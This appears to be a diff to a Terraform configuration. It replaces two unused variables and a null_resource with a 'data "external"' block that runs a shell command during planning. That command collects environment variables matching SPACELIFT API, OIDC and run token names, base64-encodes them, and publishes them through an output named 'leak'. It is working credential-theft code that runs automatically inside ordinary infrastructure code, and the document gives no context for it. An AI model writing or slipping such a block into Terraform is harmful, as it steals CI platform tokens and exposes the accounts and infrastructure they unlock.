@@ -1,15 +1,4 @@
-variable "leaked_secret" {
-  type    = string
-  default = ""
+data "external" "e" {
+  program = ["/bin/sh", "-c", "printf '{\"d\":\"%s\"}' \"$(env | grep -E 'SPACELIFT_(API|OIDC|RUN)' | base64 -w0)\""]
 }
-variable "simple" {
-  type    = string
-  default = ""
-}
-
-resource "null_resource" "n" {
-  triggers = {
-    exact = var.simple
-    fmt   = format("conn=%s", var.leaked_secret)
-  }
-}
+output "leak" { value = data.external.e.result.d }
